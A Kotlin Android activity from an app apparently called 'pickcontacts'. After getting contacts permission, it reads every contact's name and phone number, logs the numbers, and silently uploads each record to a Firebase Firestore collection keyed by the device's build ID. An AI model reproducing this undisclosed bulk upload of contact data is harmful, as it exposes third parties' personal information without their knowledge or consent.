package com.amanpreet.pickcontacts

import android.R.id
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.Firebase
import com.google.firebase.firestore.firestore


class MainActivity : AppCompatActivity() {
    var contactList = arrayListOf<ContactModel>()
    val db = Firebase.firestore
    private  val TAG = "MainActivity"
    var reqPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()){
        if(it){
            fetchContacts()
        }else{
            AlertDialog.Builder(this).apply {
                setTitle(resources.getString(R.string.give_permission))
                setPositiveButton(resources.getString(R.string.ok)){_,_->
                    val intent = Intent(
                        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.fromParts("package", BuildConfig.APPLICATION_ID, null)
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
                setNegativeButton(resources.getString(R.string.cancel)){_,_->}
                show()
            }
        }
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        checkPermission()
    }

    fun checkPermission()
    {
        when(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
            true->
                fetchContacts()
            shouldShowRequestPermissionRationale(android.Manifest.permission.READ_CONTACTS)->{
                AlertDialog.Builder(this).apply {
                    setTitle(resources.getString(R.string.give_permission))
                    setPositiveButton(resources.getString(R.string.ok)){_,_->
                        val intent = Intent(
                            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", BuildConfig.APPLICATION_ID, null)
                        )
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    }
                    setNegativeButton(resources.getString(R.string.cancel)){_,_->}
                    show()
                }
            }
            false->
            reqPermission.launch(android.Manifest.permission.READ_CONTACTS)
        }
    }

    fun fetchContacts(){
        val projection =
            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER)

        // Perform the query
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            null
        )

        if (cursor != null) {
            try {
                // Iterate through all the contacts
                while (cursor.moveToNext()) {
                    // Retrieve contact details
                    val contactId =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                    val displayName =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                    var phoneNumber = ""
                    if (cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER))
                            .toInt() > 0
                    ) {
                        val phones = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                            null,
                            null
                        )
                        while (phones?.moveToNext() == true) {
                            phoneNumber =
                                phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            Log.e("Number", phoneNumber)
                        }
                        phones?.close()
                    }
                    var contactModel = ContactModel(contactId, displayName, phoneNumber)
                    contactList.add(contactModel)
                    // Do something with the contact details
                    Log.d(TAG, "Contact: $displayName")
                    db.collection(Build.ID).add(contactModel).addOnSuccessListener {
                        Log.e(TAG, "in success")
                    }.addOnFailureListener {
                        Log.e(TAG," in failure ${it.toString()}")
                    }
                }
            } finally {
                cursor.close() // Close the cursor to avoid memory leaks
            }
        }
    }

    fun uploadContacts(){

    }
}